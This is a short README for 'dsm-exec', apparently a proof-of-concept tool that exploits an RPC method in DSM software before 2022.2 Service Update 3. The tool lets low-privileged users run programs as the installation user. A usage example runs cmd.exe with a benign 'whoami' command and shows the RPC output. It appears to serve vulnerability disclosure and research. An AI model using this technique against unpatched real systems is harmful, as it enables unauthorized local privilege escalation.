### DSM Exec

----

This project achieves code execution as the DSM software installation
user by calling an RPC method within the `enteo task execution` RPC
interface. Prior to `DSM 2022.2 Service Update 3`, this method could be
called by low privileged user accounts and allowed for local privilege
escalation.  Patched versions only allow administrative users to call
the RPC method.


### Usage

-----

```
C:\>.\dsm-exec.exe
.\dsm-exec.exe <executable> <args>

C:\>.\dsm-exec.exe C:\Windows\System32\cmd.exe "/c whoami > C:\ProgramData\hello.txt"
[*] RpcStringBindingCompose status code: 0
[*] String binding: ncalrpc:[3B1DF259-F328-42d6-A9CD-C01DD2EF31D0]
[*] RpcBindingFromStringBinding status code: 0
[*] RpcStringFree status code: 0
[*] Executing via DSM installer user: C:\Windows\System32\cmd.exe cmd.exe /c whoami > C:\ProgramData\hello.txt
[*] Execution finished without an exception.
```
